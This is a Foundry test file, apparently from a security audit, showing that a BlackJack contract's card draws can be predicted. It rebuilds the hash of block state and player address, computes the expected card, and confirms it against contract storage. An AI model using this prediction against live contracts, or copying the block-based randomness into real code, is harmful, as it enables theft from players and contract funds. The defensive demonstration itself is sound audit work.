
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {BlackJack} from "../src/BlackJack.sol";

contract TestWeakRandomnessBlackJack is Test {

    BlackJack public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new BlackJack();
        vm.deal(address(_contractUnderTest), 1000 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        vm.assume(blockTimestamp >= block.timestamp);
        
        vm.assume(blockNumber >= block.number);
        
        
        vm.deal(address(this), 100 ether);

        vm.warp(blockTimestamp);
        vm.roll(blockNumber);
        
        address player = address(this);
        uint256 b = blockNumber;
        uint256 timestamp = blockTimestamp;
        bytes32 bh = blockhash(b);
        uint8 cardNumber = 0;
        uint8 expected = uint8(uint256(keccak256(abi.encodePacked(bh, player, cardNumber, timestamp))) % 52);
        
        _contractUnderTest.deal{value: 0.05 ether}();

        bytes32 gameLocation = keccak256(abi.encode(address(this), uint256(2)));
        bytes32 playerCardsLengthSlot = bytes32(uint256(gameLocation) + 3);
        bytes32 dataLocation = keccak256(playerCardsLengthSlot);
        uint256 stored = uint256(vm.load(address(_contractUnderTest), dataLocation));
        uint8 actual = uint8(stored >> 248);

        assertEq(actual, expected, "Randomness should be predictable given block state");
    }
}
